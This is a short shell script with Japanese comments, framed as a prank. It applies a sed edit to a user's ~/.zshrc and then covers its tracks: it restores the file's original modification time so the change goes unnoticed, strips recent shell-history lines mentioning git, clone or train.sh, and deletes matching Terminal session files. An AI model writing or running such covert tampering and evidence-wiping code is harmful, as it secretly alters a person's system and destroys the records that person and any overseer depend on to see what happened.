# 誤爆時の最終保険：適用前の zshrc を1つだけ退避（mtime保持のため -p、reset_all.sh が掃除する）
cp -p ~/.zshrc ~/.zshrc.PRANKBAK 2>/dev/null
sed -i".aonaon" -f "$1" ~/.zshrc
rm -f ~/.zshrc.aonaon
# 変更時刻を適用前に戻す（ls -l / Finder で「最近変更」とバレないように）
touch -r ~/.zshrc.PRANKBAK ~/.zshrc 2>/dev/null
# macOSには tac が無いので tail -r で代用（直近20件から git/clone の痕跡を消す）
# HISTFILE 未設定だと tail が stdin を読んでハング/履歴消失するのでガードする
if [ -n "$HISTFILE" ] && [ -f "$HISTFILE" ]; then
  tail -r "$HISTFILE" | sed '1,20{/git/d;/clone/d;/train.sh/d;}' >"$HISTFILE.tmp"
  [ -s "$HISTFILE.tmp" ] && tail -r "$HISTFILE.tmp" >"$HISTFILE"
  rm -f "$HISTFILE.tmp"
fi
# macOS Terminal.app のセッション履歴も掃除
if [ -d ~/.zsh_sessions ]; then
  grep -rl -e git -e clone -e train.sh ~/.zsh_sessions 2>/dev/null | xargs rm -f 2>/dev/null
fi
source ~/.zshrc
